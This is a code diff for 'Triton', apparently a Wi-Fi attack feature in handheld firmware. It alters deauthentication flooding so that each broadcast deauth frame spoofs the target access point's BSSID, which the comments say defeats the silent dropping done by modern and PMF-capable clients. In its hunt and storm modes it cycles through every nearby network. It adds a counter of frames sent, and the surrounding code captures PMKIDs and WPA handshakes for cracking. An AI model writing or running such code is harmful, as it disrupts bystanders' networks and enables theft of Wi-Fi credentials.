@@ -38,6 +38,7 @@
 static volatile uint32_t s_pmk   = 0;
 static volatile uint32_t s_hs    = 0;
 static volatile uint32_t s_eapol = 0;
+static volatile uint32_t s_deauth_frames = 0;   /* total deauth/disassoc TX sent this session */
 static volatile uint32_t s_last_catch = 0;
 static volatile uint32_t s_born = 0;
 static volatile uint8_t  s_ch    = 1;
@@ -456,16 +457,21 @@ static void hop_task(void *)
 
         if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
-            /* Triton hops channels via the RL-picked s_ch — only
-             * deauth APs on whatever channel we happen to be on this
-             * iteration. Silent AP comes up on s_ch for the duration. */
-            wifi_silent_ap_begin(s_ch);
             if (s_mode == TM_SURGICAL) {
+                /* Spoof addr2 = target BSSID so clients/routers accept
+                 * the frame as legitimately from the AP. Previously
+                 * addr2 was our own MAC, which PMF-capable and modern
+                 * APs silently drop. */
+                wifi_silent_ap_set_source_mac(s_target_bssid);
+                wifi_silent_ap_begin(s_ch);
                 int bursts = 8;
                 for (int k = 0; k < bursts && s_alive; ++k) {
-                    wifi_deauth_broadcast(s_target_bssid, &seq);
+                    int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
+                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                     delay(5);
                 }
+                wifi_silent_ap_end();
+                wifi_silent_ap_set_source_mac(nullptr);
             } else {
                 /* Snapshot BSSIDs under the mux — cache_beacon can fire
                  * on the Wi-Fi task at any time and would otherwise race
@@ -478,15 +484,27 @@ static void hop_task(void *)
                 nb = cap;
                 portEXIT_CRITICAL(&s_bs_mux);
 
+                /* Round-robin one BSSID per hop. Spoof its MAC as the
+                 * softAP's source. Takes more wall-clock across the full
+                 * AP list (24 BSSIDs * 1.5 s hop = 36 s/cycle in HUNT)
+                 * but each frame lands with the correct addr2 so
+                 * modern clients actually honour it. */
+                static int s_bs_idx = 0;
                 int bursts = (s_mode == TM_STORM) ? 6 : 3;
-                for (int i = 0; i < nb && s_alive; ++i) {
-                    for (int k = 0; k < bursts; ++k) {
-                        wifi_deauth_broadcast(bssids[i], &seq);
+                if (nb > 0) {
+                    int target = s_bs_idx % nb;
+                    s_bs_idx = (s_bs_idx + 1) % nb;
+                    wifi_silent_ap_set_source_mac(bssids[target]);
+                    wifi_silent_ap_begin(s_ch);
+                    for (int k = 0; k < bursts && s_alive; ++k) {
+                        int sent = wifi_deauth_broadcast(bssids[target], &seq);
+                        s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                         delay(5);
                     }
+                    wifi_silent_ap_end();
+                    wifi_silent_ap_set_source_mac(nullptr);
                 }
             }
-            wifi_silent_ap_end();
         }
 
         /* Drain any PMKID/handshake captures that the Wi-Fi callback
@@ -529,11 +547,20 @@ static mood_t mood_now(void)
     uint32_t dry = (now - s_last_catch) / 1000;   /* seconds since last catch */
     uint32_t total = s_pmk + s_hs;
 
-    if (total >= 10)                 return MOOD_FERAL;
-    if (total > 0 && dry < 5)        return MOOD_STOKED;
-    if (age < 30)                    return MOOD_SLEEPY;
-    if (dry > 300)                   return MOOD_DESPAIR;
-    if (dry > 90 || total == 0)      return MOOD_HUNGRY;
+    /* Previous logic left Triton stuck in SLEEPY for 30 s then jumped
+     * straight to HUNGRY (because total == 0 matched). You never saw
+     * "on the hunt" until the first capture landed, which defeats the
+     * whole gotchi narrative. New order:
+     *   0-8 s: just booted, SLEEPY
+     *   8 s+ with 0 caps, <2 min: HUNTING (actively stalking)
+     *   2 min+ no caps: HUNGRY
+     *   5 min+ no caps: DESPAIR
+     * Capture paths unchanged. */
+    if (total >= 10)                       return MOOD_FERAL;
+    if (total > 0 && dry < 5)              return MOOD_STOKED;
+    if (age < 8)                           return MOOD_SLEEPY;
+    if (dry > 300)                         return MOOD_DESPAIR;
+    if (dry > 120)                         return MOOD_HUNGRY;
     return MOOD_HUNTING;
 }
 
@@ -755,7 +782,7 @@ void feat_triton(void)
     if (!s_file) { ui_toast("file open fail", T_BAD, 1500); return; }
 
     triton_learn_load();
-    s_pmk = 0; s_hs = 0; s_eapol = 0;
+    s_pmk = 0; s_hs = 0; s_eapol = 0; s_deauth_frames = 0;
     s_bs_n = 0; s_m1_n = 0;
 
     /* Seed BSSID→SSID cache from any prior wardrive session. Triton
@@ -915,12 +942,13 @@ void feat_triton(void)
             if (s_mode == TM_STEALTH)
                 d.setCursor(rx + 46, BODY_Y + 18), d.setTextColor(T_DIM, T_BG), d.print("RX");
 
-            /* APs. */
+            /* APs + deauth frame counter. TX stat is what the user
+             * really wants to see moving when Triton's working. */
             d.setTextColor(T_FG, T_BG);
             d.setCursor(rx, BODY_Y + 28); d.printf("APs: %d", s_bs_n);
-            /* EAP — demoted to dim. */
-            d.setTextColor(T_DIM, T_BG);
-            d.setCursor(rx, BODY_Y + 38); d.printf("EAP: %lu", (unsigned long)s_eapol);
+            d.setTextColor(s_deauth_frames > 0 ? T_BAD : T_DIM, T_BG);
+            d.setCursor(rx, BODY_Y + 38);
+            d.printf("TX:  %lu", (unsigned long)s_deauth_frames);
 
             /* PMK — green when captured. */
             d.setTextColor(s_pmk > 0 ? T_GOOD : T_DIM, T_BG);
